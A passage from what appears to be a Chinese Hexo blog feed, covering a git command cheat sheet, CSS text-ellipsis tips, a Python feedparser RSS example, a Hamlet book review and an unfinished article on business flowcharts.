class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># 下载远程仓库的所有变动</span><br><span class="line">git fetch [remote]</span><br><span class="line"></span><br><span class="line"># 显示所有远程仓库</span><br><span class="line">git remote -v</span><br><span class="line"></span><br><span class="line"># 显示某个远程仓库的信息</span><br><span class="line">git remote show [remote]</span><br><span class="line"></span><br><span class="line"># 增加一个新的远程仓库，并命名</span><br><span class="line">git remote add [shortname] [url]</span><br><span class="line"></span><br><span class="line"># 取回远程仓库的变化，并与本地分支合并</span><br><span class="line">git pull [remote] [branch]</span><br><span class="line"></span><br><span class="line"># 上传本地指定分支到远程仓库</span><br><span class="line">git push [remote] [branch]</span><br><span class="line"></span><br><span class="line"># 强行推送当前分支到远程仓库，即使有冲突</span><br><span class="line">git push [remote] --force</span><br><span class="line"></span><br><span class="line"># 推送所有分支到远程仓库</span><br><span class="line">git push [remote] --all</span><br></pre></td></tr></table></figure><h2 id="九、撤销"><a href="#九、撤销" class="headerlink" title="九、撤销"></a>九、撤销</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"># 恢复暂存区的指定文件到工作区</span><br><span class="line">git checkout [file]</span><br><span class="line"></span><br><span class="line"># 恢复某个commit的指定文件到暂存区和工作区</span><br><span class="line">git checkout [commit] [file]</span><br><span class="line"></span><br><span class="line"># 恢复暂存区的所有文件到工作区</span><br><span class="line">git checkout .</span><br><span class="line"></span><br><span class="line"># 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变</span><br><span class="line">git reset [file]</span><br><span class="line"></span><br><span class="line"># 重置暂存区与工作区，与上一次commit保持一致</span><br><span class="line">git reset --hard</span><br><span class="line"></span><br><span class="line"># 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变</span><br><span class="line">git reset [commit]</span><br><span class="line"></span><br><span class="line"># 重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致</span><br><span class="line">git reset --hard [commit]</span><br><span class="line"></span><br><span class="line"># 重置当前HEAD为指定commit，但保持暂存区和工作区不变</span><br><span class="line">git reset --keep [commit]</span><br><span class="line"></span><br><span class="line"># 新建一个commit，用来撤销指定commit</span><br><span class="line"># 后者的所有变化都将被前者抵消，并且应用到当前分支</span><br><span class="line">git revert [commit]</span><br><span class="line"></span><br><span class="line"># 暂时将未提交的变化移除，稍后再移入</span><br><span class="line">git stash</span><br><span class="line">git stash pop</span><br></pre></td></tr></table></figure><h2 id="十、常用操作组合"><a href="#十、常用操作组合" class="headerlink" title="十、常用操作组合"></a>十、常用操作组合</h2><h3 id="1-修改本地分支名和远程分支名"><a href="#1-修改本地分支名和远程分支名" class="headerlink" title="1. 修改本地分支名和远程分支名"></a>1. 修改本地分支名和远程分支名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git branch -m old_branch new_branch # 重命名本地分支</span><br><span class="line">git push origin :old_branch # 删除远程旧分支（分支名前有冒号）</span><br><span class="line">git push --set-upstream origin new_branch # 推送新的分支，并设置本地分支跟踪新的远程分支</span><br></pre></td></tr></table></figure><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p><a href="http://www.ruanyifeng.com/blog/2019/12/git-undo.html">《如何撤销 Git 操作？》</a></p><p><a href="http://www.ruanyifeng.com/blog/2020/04/git-cherry-pick.html">《git cherry-pick 教程》</a> 复制某分支上的部分提交到另一个分支上（相对于可以选择指定提交的 rebase 操作）。</p><p><a href="https://www.ruanyifeng.com/blog/2015/12/git-cheat-sheet.html">常用 Git 命令清单</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令 </tag>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用代码实现文字在超出内容时显示省略号</title>
      <link href="/129.html"/>
      <url>/129.html</url>
      
        <content type="html"><![CDATA[<h2 id="一行超出显示省略"><a href="#一行超出显示省略" class="headerlink" title="一行超出显示省略"></a>一行超出显示省略</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">overflow: hidden;</span><br><span class="line">white-space: nowrap;</span><br><span class="line">text-overflow: ellipsis;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">   &lt;div class=&quot;box-42b6&quot;&gt;演示文字演示文字演示文字演示文字演示文字演示文字演示文字演示文字演示文字演示文字演示文字演示文字演示文字演示文字演示文字演示文字演示文字&lt;/div&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    .box-42b6&#123;</span><br><span class="line">        border: 1px solid #999;</span><br><span class="line">        width: 200px;</span><br><span class="line"></span><br><span class="line">        overflow: hidden;</span><br><span class="line">        white-space: nowrap;</span><br><span class="line">        text-overflow: ellipsis;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>:::</p><h2 id="两行（多行）超出显示省略号"><a href="#两行（多行）超出显示省略号" class="headerlink" title="两行（多行）超出显示省略号"></a>两行（多行）超出显示省略号</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">overflow: hidden;</span><br><span class="line">white-space: normal;</span><br><span class="line">text-overflow: ellipsis;</span><br><span class="line">display: -webkit-box;</span><br><span class="line">-webkit-line-clamp: 2;</span><br><span class="line">-webkit-box-orient: vertical;</span><br></pre></td></tr></table></figure><p>显示的行数由<code>line-clamp</code>样式的值决定。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">   &lt;div class=&quot;box2-42b6&quot;&gt;演示文字演示文字演示文字演示文字演示文字演示文字演示文字演示文字演示文字演示文字演示文字演示文字演示文字演示文字演示文字演示文字演示文字&lt;/div&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    .box2-42b6&#123;</span><br><span class="line">        border: 1px solid #999;</span><br><span class="line">        width: 200px;</span><br><span class="line"></span><br><span class="line">        overflow: hidden;</span><br><span class="line">        white-space: normal;</span><br><span class="line">        text-overflow: ellipsis;</span><br><span class="line">        display: -webkit-box;</span><br><span class="line">        -webkit-line-clamp: 2;</span><br><span class="line">        -webkit-box-orient: vertical;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>:::</p><h2 id="JS判断是否显示了省略号"><a href="#JS判断是否显示了省略号" class="headerlink" title="JS判断是否显示了省略号"></a>JS判断是否显示了省略号</h2><p>有时候我们需要知道是否已经溢出，显示了省略号，可以用到<code>clientHeight</code>和<code>scrollHeight</code>的知识：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">let cHeight = noWrapDiv.clientHeight;</span><br><span class="line">let sHeight = noWrapDiv.scrollHeight;</span><br><span class="line">if (sHeight &gt; cHeight) &#123;</span><br><span class="line">      console.log(&quot;已经溢出显示省略号&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">      console.log(&quot;没有溢出&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里可以用于判断是否溢出显示展开收缩按钮。</p></blockquote><h2 id="知识点拓展"><a href="#知识点拓展" class="headerlink" title="知识点拓展"></a>知识点拓展</h2><p>scrollHeight：元素内容的高度，包括由于溢出导致的视图中不可见内容。不包含滚动条、边框和外边距。</p><p>clientHeight：元素内容的可视区的高度，包含内边距，但不包括水平滚动条、边框和外边距。</p><p>offsetHeight：元素的像素高度，高度包含该元素的垂直内边距和边框，且是一个整数。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python实现RSS解析</title>
      <link href="/128.html"/>
      <url>/128.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>今天带大家了解一种暴力解析Rss种子的方式<code>feedparser</code>，连爬取带解析，对于blog，新闻带RSS功能的是既方便又简单。</p></blockquote><h2 id="了解"><a href="#了解" class="headerlink" title="了解"></a>了解</h2><p><code>RSS</code>： RSS订阅能更快地获取信息，网站提供RSS输出，有利于让用户获取网站内容的最新更新。</p><p><code>feedparser</code>： 可以轻松从任何 RSS 或 Atom 订阅源抓取标题、链接和文章的条目。</p><p><code>pprint</code>: 格式化美观输出内容</p><h2 id="安装模块"><a href="#安装模块" class="headerlink" title="安装模块"></a>安装模块</h2><p>安装<code>feedparser</code>模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install feedparser</span><br></pre></td></tr></table></figure><p>安装pprint模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pprint</span><br></pre></td></tr></table></figure><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>首先导入<code>feedparser</code>和<code>pprint</code>库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import feedparser</span><br><span class="line">import pprint</span><br></pre></td></tr></table></figure><p>暴力解析RSS资源 这里用的是开源中国的RSS订阅源</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 网站种子解析</span><br><span class="line">rss_oschina = feedparser.parse(&#x27;https://www.oschina.net/news/rss&#x27;)</span><br><span class="line"># 抓取内容 ， depth 抓取深度</span><br><span class="line">pprint.pprint(rss_oschina,depth=1)</span><br></pre></td></tr></table></figure><p>其中 <code>depth</code> 可以根据订阅源数据深度设置 ，这里可用1 - 5测试</p><p>打印编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(rss_oschina[&#x27;encoding&#x27;])</span><br></pre></td></tr></table></figure><p>for 循环取出需要的数据 这一步演示传统取值方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for entry in rss_oschina[&#x27;entries&#x27;]:</span><br><span class="line">     print(entry[&#x27;title&#x27;])</span><br><span class="line">     print(entry[&#x27;link&#x27;])</span><br><span class="line">     print(entry[&#x27;published&#x27;])</span><br></pre></td></tr></table></figure><p>整理为<code>JSON</code>数组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mylist = [&#123;&#x27;title&#x27;: entry[&#x27;title&#x27;], &#x27;link&#x27;:entry[&#x27;link&#x27;]&#125; for entry in rss_oschina[&#x27;entries&#x27;]]</span><br><span class="line">pprint.pprint(mylist)</span><br></pre></td></tr></table></figure><h2 id="具体代码"><a href="#具体代码" class="headerlink" title="具体代码"></a>具体代码</h2><p>这里以标题和链接抓取为例，超简单代码实现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import feedparser</span><br><span class="line">import pprint</span><br><span class="line">&quot;&quot;&quot;抓取开源中国RSS&quot;&quot;&quot;</span><br><span class="line"># 网站种子解析</span><br><span class="line">rss_oschina = feedparser.parse(&#x27;https://www.oschina.net/news/rss&#x27;)</span><br><span class="line"># 整理为JSON数组</span><br><span class="line">mylist = [&#123;&#x27;title&#x27;: entry[&#x27;title&#x27;], &#x27;link&#x27;:entry[&#x27;link&#x27;]&#125; for entry in rss_oschina[&#x27;entries&#x27;]]</span><br><span class="line">pprint.pprint(mylist)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> rss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>书评分享 - 从一个孩子到一位战士 《哈姆莱特》</title>
      <link href="/126.html"/>
      <url>/126.html</url>
      
        <content type="html"><![CDATA[<p>有人说，他是一位孤军奋斗，忧郁跌宕，最后征服一切困难，具有萌芽和上升时期资产阶级精神面貌的王子。</p><p>有人说，他是一个代表先进人们为了把人类从压迫中解放出来，热烈的寻求人生的理想和精神枷锁解脱方式，成为解放人类的光荣战斗中的一员杰出战士。</p><p>有人说，他还是为了人类美好的理想，反抗社会罪恶的一个人文主义思想家。</p><p>也有人说，他更是处于精神危机中的理想与现实冲突中的人，甚至有浓厚的宗教神学色彩和封建意识。</p><hr><p>他是谁？</p><p>他是莎士比亚笔下的一位传奇人物，他是丹麦的一位王子，他是世界文学史上一个经典形象，他就是哈姆雷特。</p><p><strong>“一千个读者就有一千个哈姆雷特”</strong>，每一位读者对于哈姆雷特的形象，都有属于自己的独特见解。以上的文字是他人对哈姆雷特的解读，而我眼中的哈姆雷特也是别具一格的。我认为，我们不能静态的去看待哈姆雷特这个形象，我们应该把他看作是一个动态的，富有生命力的过程。在莎士比亚的笔下，哈姆雷特从一个无知善良的孩子，一步一步的迈向成熟，最终成为一个英勇的战士。当然在这个净化过程中有许多的徘徊与后退，但是站在人性的角度而言，这些都是可以理解的。如果他一有为父报仇想法，就开始为此坚定不移，进行一系列报仇行为，那么我们这个文学上的经典形象将会大打折扣，变得与那些三流小说的人物没有什么区别了。他的经典就是因为他面对复仇，道德，爱情的种种思考，“生或是死，都是一个问题”，他在积极报仇过程中所表现的一些懦弱与退怯，才让这个形象，更加的真实，更加贴近我们读者的内心世界。并且在某些地方让哈姆雷特的矛盾心理与读者产生共鸣。</p><p>哈姆雷特的经典形象，在中外的文学研究史上都是无人质疑的事实。</p><p>首先，在老国王未死之前，哈姆雷特就像是生活在温室的花朵。他的社会地位是丹麦的王子，在物质上，他十分富有，不存在任何物质生活上的担忧；在精神方面，他就读的是英国威登堡大学，接受的是人文主义等先进思想的熏陶。他对世界充满着无限的热情，他高声称赞：“人是何等的巧妙的天工，理性何等的高贵，智能何等的广大……行动是多么像天使，悟性是多么像神明，真是世界之美，万物之灵！”在爱情领域也是有着无尽的憧憬。在给哦菲利亚的信中，他说：“你可怀疑星是火，你可怀疑太阳会动，怀疑真理变成谎言，但永莫怀疑我的情。”可以说此时的哈姆雷特是十分的幸福，因为幸福而单纯。社会的黑暗一面的在他的生活中是没有出现的机会。如果按照他这样的生活轨迹，他应该可以保持这份孩童的赤子之心，以乐观的心态去面对他之后的人生。</p><p>可是磨难还在等待着我们的王子。两个月不到的时光里，老国王去世了，哈姆雷特的叔叔继承了王位，他的母亲成了新王的妻子。这个突然来袭的噩耗，让我们单纯的王子——慌了。他觉得事情的不对劲，却没有勇气去调查真相。他有着自己的反抗，却只能是默默的。“乌云满面，愁眉不展”。这似乎是他唯一可以去做的表情。再多的言语都无法改变的事实，他的反抗没有任何的效益，只有默默接受国王和王后的安排，留在丹麦。想要真相，想要反抗，想要挣扎，却受到外在无形的，巨大的压力，剩下只有忍受。孩子没有说不的权利。</p><p>当然，如果哈姆雷特就这样的屈服了，我们的剧本也无法继续。在这个事件中，他慢慢成长着，他看到了世界的另一面，那些社会的黑暗在不断显现出来，之前的完美世界在一步一步的走向崩溃。但是这些还是不够，他需要更大的动力来反抗压在他身上的绝对权利。</p><p>老国王的灵魂出现了，把他死去的真相告诉了哈姆雷特。这是王子从一个孩子向一个战士进化的重要契机。但是这时的哈姆雷特虽然穿上了战衣，准备为自己的父亲复仇，可是他的灵魂还是一个孩子，他的意志还不够坚强。道德，大局，宗教还是影响他的决定。知道自己父亲的惨死，母亲的失贞，叔叔的残暴，他开始了对于一切都保持着怀疑的态度。当他的朋友想要帮忙时，他的回答“你们可以去照你们自己的意思干你们自己的事情，各人都有各人的意思和各人的事情。”他不相信友情；对于自己曾经心爱的女孩欧菲利亚，他也恶言相对“你去进尼姑庵吧”，这是哈姆雷特对欧菲利亚唯一的“要求”，不相信爱情；对于这个世界充满着不满，他对自己也是相当不满。</p><p>他的装疯卖傻是一个智者深思熟虑的结果，还是一个孩子不知所以下的答案？他的那些疯言疯语中，“可是我，一个糊涂的家伙，垂头丧气，一天到晚永在梦似的忘记了杀父的大仇……我却始终不支一声，我是懦夫吗？谁骂我恶人？谁敲破我的脑壳？……吓！我应该忍受这样的侮辱，因为我是一个没有心肝，逆来顺受的怯汉……报仇……空言，软弱和忧郁。”我们看到的是一个犹豫不决的，敢言不敢做的形象。他是一个被社会道德压迫下——为父亲报仇，想要找到解脱，却又怕报仇的后果，对于自己的懦弱感到羞耻，对罪恶的世界却也不敢太多的挑战，另一方面，也在寻找合适的时机，合适的方式来进行报仇。他孩子般的灵魂在内心争斗着。</p><p>如果一个人的内心是软弱的，不坚定的，那让他变得坚强的很大一部分原因可能来自他身处的外在环境。在哈姆雷特犹豫，徘徊时，他身边的人在无意识的帮助他做出最后的决定。他的好朋友罗森克兰背叛了他们之间的友谊，他的爱慕的女子成了封建社会的工具，善良的艺术家被迫流浪，所有的不公正事件，社会的种种黑暗现象，这些都在影响哈姆雷特，督促他要去报仇，去改变整个世界，这是他一部分的精神力量。像个孩子一样，轻易接受来自别人的苦难。<br>当然最重要的还是哈姆雷特自己的成长，自己的报仇的信念的增强。</p><p>“生或是死，这是一个问题”。哈姆雷特最经典的独白。在面对这个残酷的世界，哈路雷特的选择是多么的困难。他如果选择死亡，那么可能是什么责任，报仇都可以抛弃，因为不能要求一个死人去做什么事情，但是哈姆雷特对于死亡充满的恐惧，对于自己父亲的死，还有种种责任，让他连死都不安心。如果选择活着，那他就是要杀死自己的叔叔，要重整国家，政治，亲情，道德，责任把他压迫没有多余的空间呼吸。所以他唯有不断的批判才能让自己振作，尽可能去完成自己的使命。<br>因为戏剧演出，哈姆雷特被迫去了英国，在途中了解了国王的阴谋，逃脱后他能不振作吗？挪威王子为父报仇的事情也在激励我们的王子。在墓地中，当看到掘墓者手中的骷髅，哈姆雷特终于看透了生死。一个人不管生前是怎样的有权有势，死后依旧是白骨一推。一切的东西都是命运早就安排好的。那么就让命运掌控他的生命。现实逼着他走向战场，穿上了战衣，灵魂终于成长。</p><p>最后一幕中，当国王下毒，王后因误毒酒而死，哈姆雷特也因中剑毒将不久于世，终于哈姆雷特爆发了，他用尽最后的力量，把国王刺死，自己也同归于尽。<br>这是他成长的结局，是他报仇的终点，是他斗争的成果。</p><p>哈姆雷特的死，是一场悲剧，却也是对他最好的结果。当将命运的枷锁揭开了，他的责任也应该是放下了。生存在这个世界上对于哈姆雷特，失去了任何的意义。<br>莎士比亚的哈姆雷特，他的形象经典，不仅在于塑造了一个为父报仇的英雄式形象，更是因为他的英雄行为下的懦弱，他是一个传统意义下的一个大的突破。在一个痛苦的转变过程中，哈姆雷特从一个孩子成长为一个英勇的战士，这个过程也是我们每一个人都必须经历过的，所以每个人身上都有哈姆雷特的影子，他的形象也就更加引起我们的关注。</p>]]></content>
      
      
      <categories>
          
          <category> 书籍 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 书评 </tag>
            
            <tag> 哈姆莱特 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>业务流程图绘制分享</title>
      <link href="/124.html"/>
      <url>/124.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>在实际生活中，我们会碰到各种各样的流程。比如你去医院看病，你需要先去服务台领个具体要去看病的某个科室的小票，再前往挂号窗口将小票递给工作人员，缴完挂号费之后拿到挂号单，再前往具体科室去看病。各处都会有自己的流程，按照流程来走可以快速达到目的，减少不必要的麻烦，当然你也可以独辟蹊径，这就属于流程的优化。</p></blockquote><h2 id="什么是流程图？"><a href="#什么是流程图？" class="headerlink" title="什么是流程图？"></a>什么是流程图？</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>那什么是流程图呢？说文解字是一种了解定义的好方法。流程图&#x3D;流程+图，如下图：</p><p><img src="https://cos.gjcloak.xyz/pigo/202208161534988.jpeg?imageMogr2/format/webp/interlace/1/quality/80"></p><p><strong>流程</strong>：是指特定主体为了满足特定需求而进行的有特定逻辑关系的一系列操作过程，流程是自然而然就存在的。但是它可以不规范，可以不固定，可以充满问题。所以就会造成看似没有流程。</p><p><strong>图</strong>：是将基本固化有一定规律的流程进行显性化和书面化，从而有利于传播与沉淀、流程重组参考。</p><p>从定义可以看出，只要有事情和任务，流程就会有，但是并不是所有的流程都适合用流程图的方式去表现，适合用流程图去表现的流程是一定程度固定的有规律可循的，流程中的关键环节不会朝令夕改的。</p><h3 id="流程图与其他图表的对比"><a href="#流程图与其他图表的对比" class="headerlink" title="流程图与其他图表的对比"></a>流程图与其他图表的对比</h3><p>工作中我们还用到或听到很多其他类型的图表，比如交互设计师们经常说的线框图(Wireframes)，信息架构图或站点地图(Site Map)，，开发工程师们经常说的用例图(Use Case)或E-R图。这些不同的图表要表达的内容有何种差异呢？简单做个对比，如图：</p><p><img src="https://cos.gjcloak.xyz/pigo/202208161551537.jpeg?imageMogr2/format/webp/interlace/1/quality/80"></p><p>如果要串到某一个项目来说，可以理解成：</p><p>用例图（Use Case）：表现了一个角色在系统里要完成的活动是什么，比如用户这个角色与ATM取款机的交互过程中，用户需要完成的活动有存钱，取钱，查询等。而存钱这个活动再可以进一步细分为插卡，输入密码，输入金额，ATM吐钞，用户收款，退卡等活动。用例图可以不考虑用户动作的前后次序，而仅仅提取一些关键的动宾短语，映射出系统应该满足的功能点。常用用例图的人是产品经理和开发工程师。</p><p>流程图（Flow Chart）：则表示用户每一个活动的前后次序，比如用户必须要先插入银行卡，才能够输入密码，且流程图必须直接表现出各种异常判断，比如当密码错误时，出现什么提示，密码输入错误超过多少次时，出现什么提示和动作。常用流程图的人是产品经理，设计师，或者任何需要讲述业务如何运作的人。</p><p>信息架构图，站点地图(Site Map)：表现为了做一个这样的系统，功能与内容的展现层次是什么，比如用户一进去后，欢迎页面的导航如何设计，是否直接出现取款，存款，查询，或者还有别的导航？常用信息架构图的是设计师。但是常用组织架构图的是HR。</p><p>线框图（Wireframe）：将具体每个界面的内容布局和权重表达出来，且标注出一些交互细节的设计，比如当密码错误后，如何提示下一步动作。常用线框图的人是设计师。</p><p>实体关系图（E-R图）：则是数据库架构的工作，表示一个业务系统或场景中的实体时间的关系，比如储户与银行卡的关系是归属1对多，通过开卡事件产生关联。一般来讲，用矩形来表示实体，椭圆标识这个实体的属性，比如储户这个实体的属性有：姓，名，手机号码，住址等。而银行卡的属性有：开户行，开户名称，银行卡号等。</p><p>以上的这些图表各自都有领域的专家，我这里就不班门弄斧了。</p><p>那么流程图要体现出他的差异定义，要素是什么？总结出了流程图的6大要素，希望大家能够记住，这6个要素可以在以后的文章里不断回顾，你也可以拿来判断你所看到的流程图是否专业。</p><ul><li>参与者：谁在这个流程中？可以是系统，可以是个打印机，更多的指什么角色——一般是有某种工种的人。比如客服同时有小A和小B两人，但是若他们的工作性质完全一样，那么在流程图里只需要写一个客服角色就可以了。</li><li>活动：做了什么事，比如点餐，结帐等活动。</li><li>次序：这些事情发生的前后顺序如何，哪个任务是其他任务的前置条件？比如客人不结帐，就不会产生送他优惠卡的活动。</li><li>输入：每项活动开始取决于什么样的输入物或数据，比如做饭的师傅开始做菜时，需要拿到具体的点菜单。</li><li>输出：每项活动结束后，会输入什么样的文档或数据传递给下一方，比如师傅做好菜后，如何让负责传菜的人知道菜已经做好？</li><li>标准化：采用一套标准化的符号用以传递你的流程图，从而使受众更快明白。</li></ul><p>关于流程图的标准化，并不是强制的，事实上，我们见过很多种类的流程图，只要能够传递明白任务和次序其实已经归类于流程图了</p><h2 id="流程图的分类"><a href="#流程图的分类" class="headerlink" title="流程图的分类"></a>流程图的分类</h2><p>常见的流程图有 业务流程图 ， 页面流程图 。</p><p>在工作中，可能会发现经常谈的是业务流程，而作为交互设计师，他们更多产出的是页面流程图。页面流程图和业务流程图到底有什么关系呢？ 先有谁，其次再有谁呢？</p><p>先讲个故事：假设你的梦想是开个中高档的全国连锁餐馆，那么首先你想到的应该不是如何去选址，而是将为何要开连锁餐馆这件事情，以及你的定位，核心竞争力想清楚。是快餐，还是点餐，是连锁还是加盟？定位于社区还是繁华商圈？是川菜还是江浙海鲜？是面向中老年还是年轻人？是家庭主题还是动漫主题？竞争对手是谁？需要什么样的投资？可能的风险是什么？这些都想清楚了，问题都有答案了，所谓战略层要清晰了吧。然后假设你现在分析来分析去，与主要投资方决定了一个方向：面向年轻人的时尚动漫茶餐厅，连锁，但是先在厦门开始第一家，选址定位于年轻人约会，扫街的地域，比如风景区，著名商圈，电影院旁……那么，接下来呢？</p><p>接下来就是想办法让这些实现吧？那么需要做什么事情呢？选址？拉投资？搞装修？选餐饮菜单？雇佣员工？每一步怎么去做，时间点是什么？等等的任务拆解以及计划，就需要到战术层了。</p><p>这些事情的执行，总是需要请人的吧？先是核心团队分工去部署各项建设任务，当餐厅开设起来后，就需要组织稳定的运营团队，如服务、卫生、厨房、采购、人事等等，厨房里面还得分工，白案，热菜，冷菜等等吧？每个部门需要设置管理层以及汇报关系吧？所以你的组织结构就诞生了。</p><p>那具体每种角色是如何顺畅合作完成日常稳定的以及突发的各项任务呢？比如，当顾客上门时，谁去引导客人入座，谁去点菜，怎么将点菜的讯息迅速传递到厨房，并分发到酒水间、冷菜间、热菜间？并保证客人尽快能够吃到所点的菜？你必须要考虑各种人员的协作流程，优化效率，所以业务流程就出现了。</p><p>人肉运营了一段时间，没有借助任何点餐系统，你发现也还可以。客人点菜时，服务员手抄写下客人的要求，因为有复印纸，所以服务员能够将副本送入厨房，同时写下餐桌号码。厨房规模较小，负责分配任务的员工看下菜单，分别往冷菜处的黑板上写下需要他们处理的，以及跑到热菜区的黑板上写下待处理的菜品，以及去酒水间报下品名即可。可是随着经营的扩大，以上的人肉方式出现了很多问题，首先，手抄效率太低，顾客频繁换菜，响应来不及，手抄出错，导致经常报错菜。厨房很混乱，不得不多招了几个人专门跑堂。而一旦顾客要加菜，撤菜就更麻烦了，需要找出他们当时点的菜，再进行人工的批注和修改，同时要修改厨房后端的各个黑板……</p><p>所以你们想要开发一套智能系统，取代很多人肉工作，你们请了系统开发团队，他们经过评估，判断从点菜开始，一直到传菜都可以用系统解决。手持终端，能够快速传递顾客点菜需求到打印机，打印系统能够根据顾客点菜的类型进行自动的分单打印，所以热菜间看到自己的热菜菜单，冷菜间看到自己的冷菜菜单，而酒水间看到酒店菜单。当他们准备完毕后，送出，传菜员可以根据菜名与打印出来的单据进行传菜并根据顾客的点菜小票进行核对。这套系统同时必须配备结算系统，将最终确认掉的菜单及消费价格传递到结算前台，收银员能够快速进行操作。</p><p>这套系统最终是需要展现出来的，那么手持终端的界面如何设计？服务员能够用更少的点击完成一个菜的点餐吗？结算中心的界面如何设计？</p><p>通过以上的故事，是不是更明白从战略、战术、业务流程图到页面流程图的关系了？总结下：</p><ul><li>先是有一个业务需求和业务目标，也即我们的愿景是什么？（战略）</li><li>然后就诞生了我们需要分解出什么样的任务，如何执行战术？（战术）</li><li>然后就诞生了需要架构什么部门，岗位去分工协作？（组织架构）</li><li>然后就诞生了不同的部门在协作完成某件任务时的业务流程？（业务流程）</li><li>业务流程基本稳定后，往往会考虑优化效率，所以会诞生出系统来支持流程，减少人肉环节，促进数据采集（系统愿景）</li><li>为了设计这个系统